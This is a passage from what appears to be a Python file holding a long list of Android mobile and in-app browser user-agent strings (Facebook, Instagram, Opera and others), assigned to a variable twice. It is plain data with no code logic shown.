like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 Line/12.15.1/IAB','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/361.0.0.7.107;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/318.0.0.16.105;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/382.0.0.33.111;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/379.0.0.24.109;]
"""

ua=['Instagram 142.0.0.34.110 Android (28/6.0; 320dpi; 800x1212; samsung; GT-S7390; kylevess; hawaii_ss_kylevess; en_US; 215464381)','Mozilla/5.0 (Linux; U; Android 4.1.2; ru-ru; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 GSA/2.6.7.721924.arm','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/26.0.0.4.133;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/78.0.0.10.186;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/130.0.0.45.70;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/98.0.0.16.170;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/119.0.0.23.70;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390G Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/71.0.0.9.132;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/80.0.0.6.186;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/66.0.0.8.122;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-br; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_BR;FBAV/61.0.0.4.155;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/19.0.0.4.121;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/63.0.0.8.158;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/69.0.0.10.400;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/83.0.0.8.184;]	','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/94.0.0.8.182;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390G Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/74.0.0.6.186;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390G Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/Orca-Android;FBAV/173.0.0.28.82;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 27.0.0.11.97 Android (16/4.1.2; 240dpi; 480x800; samsung; GT-S7390; kylevess; hawaii_ss_kylevess; pt_PT)','Mozilla/5.0 (Linux; U; Android 4.1.2; ru-ru; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 GSA/2.8.8.849369.arm','Mozilla/5.0 (Linux; Android 11; AP5702 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 5.1.1; LGL62VL Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/263.0.0.46.121;]','Mozilla/5.0 (Linux; Android 8.1.0; Multilaser_E Build/V15_20211207; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]','Mozilla/5.0 (Linux; Android 11; W-V770 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 8.0.0; G3426 Build/48.1.A.2.122; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/336.0.0.20.117;]','Mozilla/5.0 (Linux; Android 10; Platinum K5 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]','Mozilla/5.0 (Linux; Android 11; Z6251V Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 5.1.1; SM-G530T1 Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/311.0.0.44.117;]','Mozilla/5.0 (Linux; Android 8.1.0; RCT6B03W13 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 7.1.1; A577VL Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 10; M863 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 9; SUGAR_P11 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]','Mozilla/5.0 (Linux; Android 9; Lenovo L39051 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 9; SM-J530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]','Mozilla/5.0 (Linux; Android 13; CPH2483 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.0.0.21.104;]','Mozilla/5.0 (Linux; Android 10; WP7 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 12; RP03 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.0.0.21.104;]','Mozilla/5.0 (Linux; Android 10; SH-S40P Build/QKQ1.200610.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/329.0.0.29.120;]','Mozilla/5.0 (Linux; Android 7.0; LGL163BL Build/NRD90U; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 10; M2006C3MT Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/400.0.0.37.76;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]','Mozilla/5.0 (Linux; U; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 OPR/7.2.2254.146534','Mozilla/5.0 (Linux; U; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 OPR/7.2.2254.146534','Mozilla/5.0 (Linux; Android 11; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36 OPR/73.0.3843.69488','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 NewsSapphire/23.6.401128613','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 WpsMoffice/16.8.4/arm64-v8a/1368','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 OKAndroid/18.4.4 OkApp','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 AlohaLite/1.7.1 AlohaBrowser/3.5.0','Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 WpsMoffice/16.5.2/arm64-v8a/1344','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/384.1.0.29.111;]','Mozilla/5.0 (Linux; Android 11; M2006C3MT Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/384.1.0.29.111;]','Mozilla/5.0 (Linux; Android 10; M2006C3MT Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 Line/12.15.1/IAB','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/361.0.0.7.107;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/318.0.0.16.105;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/382.0.0.33.111;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/379.0.0.24.109;']
ua=['Instagram 142.0.0.34.110 Android (28/6.0; 320dpi; 800x1212; samsung; GT-S7390; kylevess; hawaii_ss_kylevess; en_US; 215464381)','Mozilla/5.0 (Linux; U; Android 4.1.2; ru-ru; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 GSA/2.6.7.721924.arm','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/26.0.0.4.133;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/78.0.0.10.186;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/130.0.0.45.70;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/98.0.0.16.170;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/119.0.0.23.70;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390G Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/71.0.0.9.132;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/80.0.0.6.186;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/66.0.0.8.122;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-br; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_BR;FBAV/61.0.0.4.155;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/19.0.0.4.121;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/63.0.0.8.158;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/69.0.0.10.400;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/83.0.0.8.184;]	','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/94.0.0.8.182;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390G Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/74.0.0.6.186;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390G Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/Orca-Android;FBAV/173.0.0.28.82;]','Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 27.0.0.11.97 Android (16/4.1.2; 240dpi; 480x800; samsung; GT-S7390; kylevess; hawaii_ss_kylevess; pt_PT)','Mozilla/5.0 (Linux; U; Android 4.1.2; ru-ru; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 GSA/2.8.8.849369.arm','Mozilla/5.0 (Linux; Android 11; AP5702 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 5.1.1; LGL62VL Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/263.0.0.46.121;]','Mozilla/5.0 (Linux; Android 8.1.0; Multilaser_E Build/V15_20211207; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]','Mozilla/5.0 (Linux; Android 11; W-V770 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 8.0.0; G3426 Build/48.1.A.2.122; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/336.0.0.20.117;]','Mozilla/5.0 (Linux; Android 10; Platinum K5 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]','Mozilla/5.0 (Linux; Android 11; Z6251V Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 5.1.1; SM-G530T1 Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/311.0.0.44.117;]','Mozilla/5.0 (Linux; Android 8.1.0; RCT6B03W13 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 7.1.1; A577VL Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 10; M863 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 9; SUGAR_P11 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]','Mozilla/5.0 (Linux; Android 9; Lenovo L39051 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 9; SM-J530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]','Mozilla/5.0 (Linux; Android 13; CPH2483 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.0.0.21.104;]','Mozilla/5.0 (Linux; Android 10; WP7 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 12; RP03 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.0.0.21.104;]','Mozilla/5.0 (Linux; Android 10; SH-S40P Build/QKQ1.200610.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/329.0.0.29.120;]','Mozilla/5.0 (Linux; Android 7.0; LGL163BL Build/NRD90U; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]','Mozilla/5.0 (Linux; Android 10; M2006C3MT Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/400.0.0.37.76;]','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]','Mozilla/5.0 (Linux; U; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 OPR/7.2.2254.146534','Mozilla/5.0 (Linux; U; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 OPR/7.2.2254.146534','Mozilla/5.0 (Linux; Android 11; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36 OPR/73.0.3843.69488','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 NewsSapphire/23.6.401128613','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 WpsMoffice/16.8.4/arm64-v8a/1368','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 OKAndroid/18.4.4 OkApp','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 AlohaLite/1.7.1 AlohaBrowser/3.5.0','Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 WpsMoffice/16.5.2/arm64-v8a/1344','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/384.1.0.29.111;]','Mozilla/5.0 (Linux; Android 11; M2006C3MT Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/384.1.0.29.111;]','Mozilla/5.0 (Linux; Android 10; M2006C3MT Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 Line/12.15.1/IAB','Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like 